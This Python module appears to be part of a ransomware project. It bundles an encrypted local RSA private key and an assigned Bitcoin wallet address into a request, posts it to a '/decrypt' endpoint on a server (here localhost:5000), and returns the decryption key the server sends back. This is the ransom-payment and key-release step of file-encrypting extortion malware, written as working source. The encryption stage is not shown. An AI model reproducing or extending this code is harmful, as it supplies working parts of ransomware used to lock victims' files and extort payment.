import logging
import requests
from core.utils.file_ops import read_data_from_file
from core.utils.generators import generate_client_id
from base64 import b64encode, b64decode
from core.config import (
    ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
    ENCRYPTED_BITCOIN_KEY_LOCATION,
    BITCOIN_WALLET_ID_PATH,
)

logger = logging.getLogger(__name__)


def build_request():
    logger.info("Building decrypt request")

    encrypted_local_rsa_key_parts = read_data_from_file(
        ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, serialized=False
    )

    body = {
        "client_id": generate_client_id(),
        "private_key": [
            b64encode(part).decode("ascii") for part in encrypted_local_rsa_key_parts
        ],
        "assigned_wallet_address": b64encode(
            read_data_from_file(BITCOIN_WALLET_ID_PATH.encode("utf-8"))
        ).decode("ascii"),
        "payee_wallet_address": "",
    }

    return body


def send_request(server, body):
    logger.info(f"Sending request to {server}")
    response = requests.post(url=f"{server}/decrypt", json=body).json()
    return b64decode(response.get("key"))


def get_decrypted_key_from_server():
    body = build_request()
    key = send_request(server="http://localhost:5000", body=body)
    return key

